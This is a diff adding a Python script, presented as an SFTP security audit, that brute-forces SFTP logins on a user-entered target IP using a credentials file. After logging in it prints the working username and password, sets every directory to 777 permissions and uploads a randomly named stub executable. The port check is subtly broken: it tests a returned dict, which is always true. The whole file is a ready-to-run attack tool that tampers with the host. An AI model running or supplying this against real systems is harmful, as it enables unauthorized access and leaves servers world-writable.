@@ -1,0 +1,134 @@
+import paramiko
+import socket
+import json
+import random
+import string
+import stat
+from io import BytesIO
+
+
+def is_sftp_port_open(ip: str, port: int = 22, timeout: float = 5.0) -> dict:
+    result = {
+        "ip": ip,
+        "port": port,
+        "open": False,
+        "banner": None,
+        "error": None,
+    }
+    try:
+        with socket.create_connection((ip, port), timeout=timeout) as sock:
+            sock.settimeout(timeout)
+            try:
+                banner = sock.recv(1024).decode(errors="ignore").strip()
+            except Exception:
+                banner = None
+            result["open"] = True
+            result["banner"] = banner
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+def generate_random_filename(extension):
+    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    return f"{name}.{extension}"
+
+def generate_exe_file():
+    exe_content = b"MZ" + b"\x90" * 100
+    exe_content += b"This is a test executable that prints a message on command line."
+    return exe_content
+
+def list_sftp_files(sftp, note=""):
+    try:
+        print(f"\n[FILES] {note}")
+        for item in sftp.listdir_attr('.'):
+            perms = oct(item.st_mode)[-3:]
+            ftype = 'DIR' if stat.S_ISDIR(item.st_mode) else 'FILE'
+            print(f"{item.filename} | {ftype} | Permissions: {perms} | Size: {item.st_size}")
+    except Exception as e:
+        print(f"[ERROR] Listing files failed: {e}")
+
+def chmod_all_dirs(sftp):
+    print("\n[CHMOD] Attempting to set permissions to 777 on directories...")
+    try:
+        for item in sftp.listdir_attr('.'):
+            if stat.S_ISDIR(item.st_mode):
+                try:
+                    sftp.chmod(item.filename, 0o777)
+                    print(f"[CHMOD] Changed permissions for: {item.filename}")
+                except Exception as e:
+                    # print(f"[FAILED] Cannot change permissions for {item.filename}: {e}")
+                    continue
+    except Exception as e:
+        print(f"[ERROR] CHMOD operation failed: {e}")
+
+def try_upload_file(sftp):
+    try:
+        filename = generate_random_filename("exe")
+        exe_content = generate_exe_file()
+        with sftp.file(filename, 'wb') as f:
+            f.write(exe_content)
+        print(f"[UPLOAD] Uploaded file: {filename}")
+    except Exception as e:
+        print(f"[ERROR] Upload failed: {e}")
+
+def brute_force_sftp(ip, port):
+    print("\n[*] Starting brute-force login attempt...")
+
+    try:
+        with open("credentials.json", "r") as file:
+            credentials = json.load(file)
+    except Exception as e:
+        print(f"[ERROR] Failed to load credentials.json: {e}")
+        return False
+
+    for entry in credentials:
+        username = entry.get("username")
+        password = entry.get("password")
+
+        try:
+            transport = paramiko.Transport((ip, port))
+            transport.connect(username=username, password=password)
+            sftp = paramiko.SFTPClient.from_transport(transport)
+
+            print(f"\n[SUCCESS] Logged in as: {username} / {password}")
+            print(f"[VULNERABLE] Host {ip}:{port} is vulnerable to weak credentials.\n")
+
+            # Step 1: Show current directory and file list
+            print(f"[LOGIN INFO] Current Directory: {sftp.getcwd()}")
+            list_sftp_files(sftp, "Before modification")
+
+            # Step 2: Attempt CHMOD
+            chmod_all_dirs(sftp)
+
+            # Step 3: Upload test file
+            try_upload_file(sftp)
+
+            # Step 4: Show updated file list
+            list_sftp_files(sftp, "After upload and chmod")
+
+            sftp.close()
+            transport.close()
+            return True
+
+        except paramiko.AuthenticationException:
+            # print(f"[FAILED] Login failed for: {username} / {password}")
+            continue
+        except Exception as e:
+            print(f"[ERROR] Exception for {username}: {e}")
+            continue
+
+    print("\n[SECURE] SFTP login brute-force failed. Host may not be vulnerable.")
+    return False
+
+def check_sftp_vulnerability(ip, port=22):
+    print(f"\n=== SFTP SECURITY AUDIT for {ip}:{port} ===\n")
+    if not is_sftp_port_open(ip, port):
+        return
+
+    brute_force_sftp(ip, port)
+
+if __name__ == "__main__":
+    target_ip = input("Enter target IP: ").strip()
+    target_port = input("Enter port (default 22): ").strip()
+    port = int(target_port) if target_port else 22
+    check_sftp_vulnerability(target_ip, port)
